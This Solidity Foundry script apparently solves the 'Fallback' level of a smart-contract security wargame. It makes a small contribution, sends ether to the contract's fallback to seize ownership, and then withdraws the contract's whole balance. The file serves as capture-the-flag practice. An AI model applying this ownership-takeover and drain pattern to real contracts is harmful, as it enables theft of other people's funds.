// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level2FallbackSolution is Script {
    Fallback public instance = Fallback(payable(0x1B9310E0fACbFee37f455A77769a8C3C5299D722));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.contribute{value: 10 wei}();
        (bool success,) = payable(address(instance)).call{value: 10 wei}("");
        console.log("Balance: ", address(instance).balance);
        console.log("Owner: ", instance.owner());
        instance.withdraw();
        vm.stopBroadcast();
    }
}
